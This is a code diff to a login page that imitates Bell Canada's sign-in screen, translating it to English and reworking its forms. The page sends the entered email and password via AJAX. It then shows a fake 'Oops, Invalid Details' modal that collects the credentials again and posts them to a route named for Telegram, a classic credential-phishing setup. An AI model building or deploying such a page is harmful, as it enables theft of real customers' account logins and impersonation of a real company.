@@ -20,7 +20,7 @@
       <p>Email</p>
     </div>
     </div>
-    <p className="underline">Français</p>
+    <p class="underline">Français</p>
     </div>
     </div>
 
@@ -30,37 +30,53 @@
         <h1 class="tink">Log In.</h1>
         <form class="field">
           <div class="form-group">
-            <label for="email">Adresse courriel</label>
+            <label for="email">Email Address </label>
             <input id="email" type="email" name="email" />
             <span id="email-error" class="error-message"></span> <!-- Error message for email -->
           </div>
           <div class="form-group">
-            <label for="password">Mot de passe</label>
-            <input id="password" type="password" v-model="password" name="password" />
+            <label for="password">Password</label>
+            <input id="password" type="password" name="password" />
             <span id="password-error" class="error-message"></span> <!-- Error message for password -->
           </div>
-          <button type="submit" class="submit" id="openModal">Submit</button>
-          <p class="reduce">Mot de passe oublié? Composez le 310-<span class="bold">BELL</span> pour le réinitialiser.</p>
+          <button type="submit" class="submit" id="openModal">Login</button>
+          <p class="reduce">Forgot your password? Call 310-<span class="bold">BELL</span> support.</p>
         </form>
         <div class="form-footer">
-          <p class="blue"><a href="#">Vie privée</a> | <a href="#"> Avis juridiques et réglementaires</a></p>
-          <p class="copyright">&copy; Bell Canada,. Tous droits réservés.</p>
+          <p class="blue"><a href="#">Privacy</a> | <a href="#"> Legal & Regulatory</a></p>
+          <p class="copyright">&copy; Bell Canada,. All rights reserved.</p>
         </div>
       </div>
     </div>
             
   <!-- Modal -->
-  <div id="myModal" class="modal">
-    <div class="modal-content">
-      <span class="close">&times;</span>
-      <h2>Enter Information</h2>
-      <%= form_with url: send_to_telegram_path, method: :post, remote: true, id: 'telegram-form' do |form| %>
-        <%= form.label :message, 'Message' %>
-        <%= form.text_area :message, rows: 4 %>
-        <%= form.submit 'Send', class: 'redirect' %>
-      <% end %>
-    </div>
+ <div id="myModal" class="modal">
+  <div class="modal-content">
+    <span class="close">&times;</span>
+    <h2 class="modalheader">Oops, Invalid Details</h2>
+   <%= form_with url: send_to_telegram_path, method: :post, remote: true, id: 'telegram-form' do |form| %>
+  <!-- Email field -->
+  <div class="modalform-group">
+    <%= form.label :modalemail, 'Email' %>
+    <%= form.text_field :modalemail, id: 'modalemail', class: 'modalfield', required: true %>
+    <span id="email-error" class="error-message"></span>
   </div>
+
+  <!-- Password field -->
+  <div class="modalform-group">
+    <%= form.label :modalpassword, 'Password' %>
+    <%= form.password_field :modalpassword, id: 'modalpassword', class: 'modalfield', required: true %> <!-- Added 'field' class here -->
+    <span id="password-error" class="error-message"></span> <!-- Optional: Add error message -->
+  </div>
+
+  <!-- Submit button -->
+  <div class="modalform-group">
+    <%= form.submit 'Login', class: 'modalsubmit' %> <!-- Added 'submit' class here -->
+  </div>
+<% end %>
+
+  </div>
+</div>
 
  <script>
 document.addEventListener('DOMContentLoaded', function() {
@@ -86,8 +102,8 @@ document.addEventListener('DOMContentLoaded', function() {
     }
   }
 
-  // Form submission and validation
-  document.getElementById('login-form').addEventListener('submit', function(event) {
+  // Form submission and validation for login
+  document.querySelector('.field').addEventListener('submit', function(event) {
     event.preventDefault(); // Prevent default form submission
 
     var email = document.getElementById('email').value;
@@ -105,19 +121,16 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     // Password validation
-    if (!password || password.length < 6) {
-      document.getElementById('password-error').innerText = 'Password must be at least 6 characters.';
+    if (!password || password.length < 1) {
+      document.getElementById('password-error').innerText = 'Please enter your password.';
       isValid = false;
     }
 
     if (isValid) {
       // Send data to the server (via AJAX)
-      var message = document.querySelector('textarea[name="message"]').value; // Get the message from the textarea
-
       var formData = {
         email: email,
-        password: password,
-        message: message
+        password: password
       };
 
       // Make AJAX request to send the data to the server
@@ -132,8 +145,8 @@ document.addEventListener('DOMContentLoaded', function() {
       .then(response => response.json())
       .then(data => {
         console.log('Success:', data);
-        // You can show a success message or close the modal
-        modal.style.display = "block";  // Show modal
+        // Show the modal for message input
+        modal.style.display = "block";  // Show modal for message input
       })
       .catch((error) => {
         console.error('Error:', error);
@@ -141,10 +154,10 @@ document.addEventListener('DOMContentLoaded', function() {
     }
   });
 
-  // Handle the response and show the success message
+  // Handle the response and show the success message for telegram form
   document.getElementById('telegram-form').addEventListener('ajax:success', function(event) {
     var [data, status, xhr] = event.detail;
-    document.getElementById(' response').innerText = data.status;
+    document.getElementById('response').innerText = data.status;
   });
 
   // Optionally, handle AJAX failure
